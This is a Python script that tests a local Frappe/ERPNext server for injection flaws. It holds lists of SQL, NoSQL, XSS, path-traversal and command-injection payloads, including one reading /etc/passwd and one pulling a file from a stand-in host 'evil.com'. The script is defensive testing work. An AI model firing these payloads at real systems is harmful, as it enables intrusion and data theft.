#!/usr/bin/env python3
"""
SQL Injection and Input Validation Security Testing
Comprehensive testing for SQL injection, NoSQL injection, and input validation vulnerabilities
"""

import sys
import os
import json
import requests
import time
import urllib.parse
from datetime import datetime

sys.path.insert(0, '/home/said/frappe-dev/frappe-bench')

class InjectionSecurityTests:
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url
        self.test_results = []
        self.session = requests.Session()
        
        # SQL injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE test;--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(5)--",
            "' OR (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--"
        ]
        
        # Error-based SQL injection payloads
        self.error_sql_payloads = [
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND ExtractValue(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND UpdateXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
        ]
        
        # Time-based SQL injection payloads
        self.time_sql_payloads = [
            "' AND SLEEP(5)--",
            "' OR IF(1=1, SLEEP(5), 0)--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        # NoSQL injection payloads
        self.nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$or": [{"a": 1}, {"b": 2}]}
        ]
        
        # XSS payloads for input validation
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>"
        ]
        
        # Common test endpoints for ERPNext/Frappe
        self.test_endpoints = [
            "/api/method/frappe.desk.search.search_link",
            "/api/method/frappe.desk.search.search_widget", 
            "/api/method/frappe.desk.search.get_names_for_mentions",
            "/api/resource/Customer",
            "/api/resource/Item",
            "/api/resource/Supplier",
            "/api/resource/User",
            "/api/method/frappe.desk.reportview.get",
            "/api/method/frappe.client.get_list",
            "/api/method/frappe.client.get"
        ]
    
    def log_test(self, test_name, status, details, severity="info"):
        """Log test results"""
        result = {
            "test": test_name,
            "status": status,
            "details": details,
            "severity": severity,
            "timestamp": datetime.now().isoformat()
        }
        self.test_results.append(result)
        
        status_icon = "✅" if status == "PASS" else "❌"
        print(f"{status_icon} {test_name}: {status} - {details}")
    
    def test_basic_sql_injection(self):
        """Test basic SQL injection vulnerabilities"""
        print("\n💉 Testing Basic SQL Injection...")
        
        vulnerabilities_found = 0
        
        for endpoint in self.test_endpoints:
            for payload in self.sql_payloads:
                try:
                    # Test GET parameters
                    params = {
                        'txt': payload,
                        'query': payload,
                        'search': payload,
                        'filters': payload,
                        'doctype': payload
                    }
                    
                    response = self.session.get(f"{self.base_url}{endpoint}", 
                                              params=params, timeout=10)
                    
                    # Check for SQL error indicators
                    sql_errors = [
                        "mysql", "sql syntax", "mysqli", "mariadb",
                        "ORA-", "oracle", "postgresql", "sqlite",
                        "syntax error", "unexpected token",
                        "table doesn't exist", "column not found",
                        "duplicate entry", "foreign key constraint"
                    ]
                    
                    response_text = response.text.lower()
                    for error in sql_errors:
                        if error in response_text:
                            self.log_test("SQL Injection", "FAIL", 
                                        f"SQL error exposed at {endpoint} with payload: {payload[:20]}...", 
                                        "high")
                            vulnerabilities_found += 1
                            break
                    
                    # Test POST data
                    post_data = {
                        'cmd': 'frappe.client.get_list',
                        'doctype': payload,
                        'filters': json.dumps({"name": payload})
                    }
                    
                    response = self.session.post(f"{self.base_url}/api/method/frappe.client.get_list",
                                               data=post_data, timeout=10)
                    
                    response_text = response.text.lower()
                    for error in sql_errors:
                        if error in response_text:
                            self.log_test("SQL Injection", "FAIL", 
                                        f"SQL error in POST at {endpoint} with payload: {payload[:20]}...", 
                                        "high")
                            vulnerabilities_found += 1
                            break
                            
                except requests.exceptions.RequestException:
                    pass
        
        if vulnerabilities_found == 0:
            self.log_test("SQL Injection", "PASS", "No basic SQL injection vulnerabilities detected")
        
        return vulnerabilities_found == 0
    
    def test_error_based_sql_injection(self):
        """Test error-based SQL injection"""
        print("\n🚨 Testing Error-Based SQL Injection...")
        
        vulnerabilities_found = 0
        
        for endpoint in self.test_endpoints:
            for payload in self.error_sql_payloads:
                try:
                    params = {'txt': payload, 'query': payload}
                    response = self.session.get(f"{self.base_url}{endpoint}", 
                                              params=params, timeout=10)
                    
                    # Look for database version or structure information leakage
                    info_leakage = [
                        "mysql", "mariadb", "version", "database",
                        "schema", "information_schema", "table",
                        "column", "user()", "@@version"
                    ]
                    
                    response_text = response.text.lower()
                    for info in info_leakage:
                        if info in response_text and "error" in response_text:
                            self.log_test("Error-Based SQL Injection", "FAIL",
                                        f"Database information leaked at {endpoint}", "high")
                            vulnerabilities_found += 1
                            break
                            
                except requests.exceptions.RequestException:
                    pass
        
        if vulnerabilities_found == 0:
            self.log_test("Error-Based SQL Injection", "PASS", 
                        "No error-based SQL injection vulnerabilities detected")
        
        return vulnerabilities_found == 0
    
    def test_time_based_sql_injection(self):
        """Test time-based SQL injection"""
        print("\n⏱️ Testing Time-Based SQL Injection...")
        
        vulnerabilities_found = 0
        
        for endpoint in self.test_endpoints:
            for payload in self.time_sql_payloads:
                try:
                    start_time = time.time()
                    
                    params = {'txt': payload, 'query': payload}
                    response = self.session.get(f"{self.base_url}{endpoint}", 
                                              params=params, timeout=15)
                    
                    end_time = time.time()
                    response_time = end_time - start_time
                    
                    # If response takes significantly longer (>4 seconds), might indicate time-based injection
                    if response_time > 4:
                        self.log_test("Time-Based SQL Injection", "FAIL",
                                    f"Potential time-based SQL injection at {endpoint} (response time: {response_time:.2f}s)",
                                    "medium")
                        vulnerabilities_found += 1
                        
                except requests.exceptions.RequestException:
                    pass
        
        if vulnerabilities_found == 0:
            self.log_test("Time-Based SQL Injection", "PASS", 
                        "No time-based SQL injection vulnerabilities detected")
        
        return vulnerabilities_found == 0
    
    def test_nosql_injection(self):
        """Test NoSQL injection vulnerabilities"""
        print("\n🍃 Testing NoSQL Injection...")
        
        vulnerabilities_found = 0
        
        for endpoint in self.test_endpoints:
            for payload in self.nosql_payloads:
                try:
                    # Test as JSON in POST request
                    post_data = {
                        'cmd': 'frappe.client.get_list',
                        'doctype': 'Customer',
                        'filters': json.dumps(payload)
                    }
                    
                    response = self.session.post(f"{self.base_url}/api/method/frappe.client.get_list",
                                               data=post_data, timeout=10)
                    
                    # Look for NoSQL error indicators
                    nosql_errors = [
                        "mongodb", "nosql", "bson", "objectid",
                        "aggregate", "$match", "$group", "$sort",
                        "collection", "cursor", "mongod"
                    ]
                    
                    response_text = response.text.lower()
                    for error in nosql_errors:
                        if error in response_text:
                            self.log_test("NoSQL Injection", "FAIL",
                                        f"NoSQL error exposed at {endpoint}", "medium")
                            vulnerabilities_found += 1
                            break
                            
                    # Test as URL parameter
                    if isinstance(payload, dict):
                        param_payload = json.dumps(payload)
                        params = {'filters': param_payload, 'query': param_payload}
                        response = self.session.get(f"{self.base_url}{endpoint}",
                                                  params=params, timeout=10)
                        
                        response_text = response.text.lower()
                        for error in nosql_errors:
                            if error in response_text:
                                self.log_test("NoSQL Injection", "FAIL",
                                            f"NoSQL error in GET params at {endpoint}", "medium")
                                vulnerabilities_found += 1
                                break
                                
                except requests.exceptions.RequestException:
                    pass
                except json.JSONEncodeError:
                    pass
        
        if vulnerabilities_found == 0:
            self.log_test("NoSQL Injection", "PASS", "No NoSQL injection vulnerabilities detected")
        
        return vulnerabilities_found == 0
    
    def test_xss_input_validation(self):
        """Test XSS and input validation"""
        print("\n🎭 Testing XSS and Input Validation...")
        
        vulnerabilities_found = 0
        
        for payload in self.xss_payloads:
            for endpoint in self.test_endpoints:
                try:
                    # Test GET parameters
                    params = {
                        'txt': payload,
                        'query': payload,
                        'search': payload,
                        'name': payload,
                        'title': payload
                    }
                    
                    response = self.session.get(f"{self.base_url}{endpoint}",
                                              params=params, timeout=10)
                    
                    # Check if payload is reflected without proper encoding
                    if (payload in response.text and 
                        "text/html" in response.headers.get("content-type", "")):
                        self.log_test("XSS Input Validation", "FAIL",
                                    f"XSS payload reflected at {endpoint}: {payload[:30]}...", "medium")
                        vulnerabilities_found += 1
                        
                    # Test POST data
                    post_data = {
                        'cmd': 'frappe.desk.search.search_link',
                        'txt': payload,
                        'doctype': 'Customer'
                    }
                    
                    response = self.session.post(f"{self.base_url}/api/method/frappe.desk.search.search_link",
                                               data=post_data, timeout=10)
                    
                    if (payload in response.text and 
                        "text/html" in response.headers.get("content-type", "")):
                        self.log_test("XSS Input Validation", "FAIL",
                                    f"XSS payload reflected in POST: {payload[:30]}...", "medium")
                        vulnerabilities_found += 1
                        
                except requests.exceptions.RequestException:
                    pass
        
        if vulnerabilities_found == 0:
            self.log_test("XSS Input Validation", "PASS", "No XSS vulnerabilities detected")
        
        return vulnerabilities_found == 0
    
    def test_file_inclusion(self):
        """Test for Local/Remote File Inclusion vulnerabilities"""
        print("\n📁 Testing File Inclusion Vulnerabilities...")
        
        file_inclusion_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "/proc/version",
            "/proc/self/environ",
            "http://evil.com/malicious.txt",
            "file:///etc/passwd",
            "php://filter/read=convert.base64-encode/resource=index.php"
        ]
        
        vulnerabilities_found = 0
        
        for payload in file_inclusion_payloads:
            try:
                # Test common file inclusion parameters
                params = {
                    'file': payload,
                    'path': payload,
                    'include': payload,
                    'page': payload,
                    'template': payload
                }
                
                response = self.session.get(f"{self.base_url}/api/method/frappe.www.printview",
                                          params=params, timeout=10)
                
                # Look for file inclusion indicators
                file_indicators = [
                    "root:x:", "daemon:x:", "bin:x:",  # /etc/passwd
                    "localhost", "127.0.0.1",  # hosts file
                    "HTTP_", "SERVER_",  # environment variables
                    "<?php", "<!DOCTYPE"  # source code
                ]
                
                for indicator in file_indicators:
                    if indicator in response.text:
                        self.log_test("File Inclusion", "FAIL",
                                    f"File inclusion vulnerability with payload: {payload}", "high")
                        vulnerabilities_found += 1
                        break
                        
            except requests.exceptions.RequestException:
                pass
        
        if vulnerabilities_found == 0:
            self.log_test("File Inclusion", "PASS", "No file inclusion vulnerabilities detected")
        
        return vulnerabilities_found == 0
    
    def test_command_injection(self):
        """Test for command injection vulnerabilities"""
        print("\n💻 Testing Command Injection...")
        
        command_payloads = [
            "; ls -la",
            "| whoami",
            "& ping -c 3 127.0.0.1",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| dir",
            "& ipconfig",
            "; pwd"
        ]
        
        vulnerabilities_found = 0
        
        for payload in command_payloads:
            try:
                # Test in various parameters that might be processed by shell
                params = {
                    'cmd': payload,
                    'command': payload,
                    'exec': payload,
                    'system': payload,
                    'filename': f"test{payload}",
                    'path': f"/tmp{payload}"
                }
                
                response = self.session.get(f"{self.base_url}/api/method/frappe.utils.file_manager.get_file",
                                          params=params, timeout=10)
                
                # Look for command execution indicators
                command_indicators = [
                    "root", "daemon", "bin",  # user listing
                    "/bin/", "/usr/", "/home/",  # directory listing
                    "uid=", "gid=",  # id command output
                    "PING", "64 bytes",  # ping output
                    "total ", "drwx",  # ls output
                    "Directory of"  # Windows dir output
                ]
                
                for indicator in command_indicators:
                    if indicator in response.text:
                        self.log_test("Command Injection", "FAIL",
                                    f"Command injection vulnerability with payload: {payload}", "critical")
                        vulnerabilities_found += 1
                        break
                        
            except requests.exceptions.RequestException:
                pass
        
        if vulnerabilities_found == 0:
            self.log_test("Command Injection", "PASS", "No command injection vulnerabilities detected")
        
        return vulnerabilities_found == 0
    
    def run_all_tests(self):
        """Run all injection security tests"""
        print("💉 Starting Injection & Input Validation Security Tests")
        print("=" * 60)
        
        tests = [
            self.test_basic_sql_injection,
            self.test_error_based_sql_injection,
            self.test_time_based_sql_injection,
            self.test_nosql_injection,
            self.test_xss_input_validation,
            self.test_file_inclusion,
            self.test_command_injection
        ]
        
        passed = 0
        failed = 0
        
        for test in tests:
            try:
                if test():
                    passed += 1
                else:
                    failed += 1
            except Exception as e:
                self.log_test(test.__name__, "ERROR", f"Test failed: {str(e)}")
                failed += 1
        
        print("\n" + "=" * 60)
        print(f"Injection Security Tests Summary:")
        print(f"Passed: {passed}, Failed: {failed}")
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = f"/home/said/frappe-dev/frappe-bench/tests/security/reports/injection_security_{timestamp}.json"
        with open(report_path, 'w') as f:
            json.dump(self.test_results, f, indent=2)
        
        print(f"Report saved to: {report_path}")
        return failed == 0

def main():
    """Main function"""
    injection_tests = InjectionSecurityTests()
    success = injection_tests.run_all_tests()
    return 0 if success else 1

if __name__ == "__main__":
    exit(main())
